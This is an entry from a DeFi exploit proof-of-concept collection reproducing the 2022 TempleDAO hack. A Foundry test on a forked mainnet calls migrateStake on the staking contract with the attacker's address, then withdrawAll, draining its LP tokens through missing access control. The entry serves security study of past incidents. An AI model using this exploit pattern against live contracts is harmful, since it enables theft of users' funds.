# [?] Templedao - Insufficient access control

## Summary
Severity: Unknown
Chain: Ethereum
Component: Templedao
Published: 2022-10-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Templedao_exp.sol
Type: defi-exploit-poc

## Details
Lost: $2.3 million

```solidity
contract ContractTest is Test {
    IERC20 constant xFraxTempleLP = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
    IStaxLPStaking constant StaxLPStaking = IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_725_066);
        // Adding labels to improve stack traces' readability
        vm.label(address(xFraxTempleLP), "xFraxTempleLP");
        vm.label(address(StaxLPStaking), "StaxLPStaking");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker xFraxTempleLP balance before exploit", xFraxTempleLP.balanceOf(address(this)), 18
        );

        uint256 lpbalance = xFraxTempleLP.balanceOf(address(StaxLPStaking));

        // Perform migrateStake()
        StaxLPStaking.migrateStake(address(this), lpbalance);

        // Perform withdrawAll()
        StaxLPStaking.withdrawAll(false);

        emit log_named_decimal_uint(
            "[End] Attacker xFraxTempleLP balance after exploit", xFraxTempleLP.balanceOf(address(this)), 18
        );
    }

    function migrateWithdraw(
        address,
        uint256
    )
        public //callback
    {}
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Templedao_exp.sol_
